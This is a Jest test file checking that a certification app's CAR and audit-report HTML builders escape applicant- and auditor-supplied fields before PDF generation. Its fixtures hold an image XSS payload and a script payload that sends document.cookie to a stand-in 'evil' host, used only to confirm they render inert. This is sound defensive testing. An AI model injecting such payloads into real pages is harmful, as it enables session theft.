/**
 * SEC-001 (layer 2) — the CAR and Audit-Report builders concatenate their HTML
 * as a raw string passed straight to generatePDF() (no {{}} template escaping
 * in between), and interpolate applicant-supplied (farm name, plant type,
 * location) and auditor-supplied (free-text notes, checklist titles) values.
 * Assert those values are HTML-escaped so they cannot inject markup into the
 * official audit documents.
 *
 * Pure HTML builders — no Puppeteer launch.
 */

const carService = require('../../services/pdf/car-report-service');
const auditService = require('../../services/pdf/audit-report-service');

const IMG = '<img src=x onerror=alert(1)>';
const SCRIPT = '<script>fetch("http://evil/?c="+document.cookie)</script>';

describe('SEC-001 — CAR report escapes applicant/auditor data', () => {
    const html = carService.generateCARHTML({
        carNumber: 'CAR-2026-001',
        auditNumber: 'AUD-1',
        applicationNumber: 'APP-1',
        applicantName: IMG,
        farmName: IMG,
        auditorName: 'ผู้ตรวจ ก',
        failedItems: [{ itemCode: 'GACP-1.1', titleTh: 'หัวข้อ', notes: SCRIPT }],
        deadline: new Date('2026-06-30'),
    });

    it('does not emit raw injected markup', () => {
        expect(html).not.toContain('<img src=x');
        expect(html).not.toContain('<script>');
    });
    it('emits the escaped, inert form instead', () => {
        expect(html).toContain('&lt;img src=x');
        expect(html).toContain('&lt;script&gt;');
    });
    it('keeps the team-authored structure intact', () => {
        expect(html).toContain('Corrective Action Request');
        expect(html).toContain('class="car-number"');
    });
});

describe('SEC-001 — Audit report escapes applicant/auditor data', () => {
    const html = auditService.generateAuditReportHTML({
        auditNumber: 'AUD-2026-001',
        applicationNumber: 'APP-1',
        applicantName: IMG,
        farmName: IMG,
        plantType: IMG,
        farmLocation: { province: IMG },
        auditMode: 'ONSITE',
        scheduledDate: new Date('2026-06-01'),
        auditorInfo: { name: 'ผู้ตรวจ ข' },
        responses: [{ category: IMG, itemCode: 'G1', titleTh: 'หัวข้อ', notes: SCRIPT, response: 'FAIL' }],
        categoryScores: [{ categoryName: IMG, earnedScore: 8, maxScore: 10, percentage: 80 }],
        overallScore: 80,
        result: 'MAJOR',
        auditorNotes: SCRIPT,
    });

    it('does not emit raw injected markup anywhere', () => {
        expect(html).not.toContain('<img src=x');
        expect(html).not.toContain('<script>');
    });
    it('emits the escaped, inert form instead', () => {
        expect(html).toContain('&lt;img src=x');
        expect(html).toContain('&lt;script&gt;');
    });
    it('still renders the result badge from the hardcoded colour map (not the attacker value)', () => {
        // resultColors['MAJOR'] = #f97316 — proves the CSS colour is a safe
        // lookup, never the raw `result` value.
        expect(html).toContain('#f97316');
        expect(html).toContain('class="result-box"');
    });
});
